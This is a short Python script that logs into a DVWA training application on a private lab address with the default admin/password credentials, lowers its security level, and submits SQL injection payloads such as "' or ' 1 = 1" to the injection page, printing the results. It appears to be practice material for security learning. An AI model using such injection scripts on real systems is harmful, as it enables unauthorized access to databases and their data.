#!/usr/bin/env python


import mechanize
import re
import sys
from bs4 import BeautifulSoup

br = mechanize.Browser()
response1 = br.open('http://192.168.30.143/dvwa/login.php')
br.select_form(nr=0)
br.set_value("admin", name="username", nr=0)
br.set_value("password", name="password", nr=0)
br.submit()
print "DVWA Login successful"

response2=br.open('http://192.168.30.143/dvwa/security.php')
br.select_form(nr=0)
br.set_value(['low'], name='security', nr=0)
br.submit()
print "DVWA Security level set to low"


print "DVWA SQL Injection Checking...."
response3=br.open('http://192.168.30.143/dvwa/vulnerabilities/sqli/')

sqlipayloadlist=["' or ' 1 = 1", "1"]
for sqli in sqlipayloadlist:
        print sqli
        br.select_form(nr=0)
        br.set_value(sqli, name="id", nr=0)
        br.submit()
        soup = BeautifulSoup(br.response().read(),'lxml')
        pre_content=soup.find_all('pre')
        print pre_content
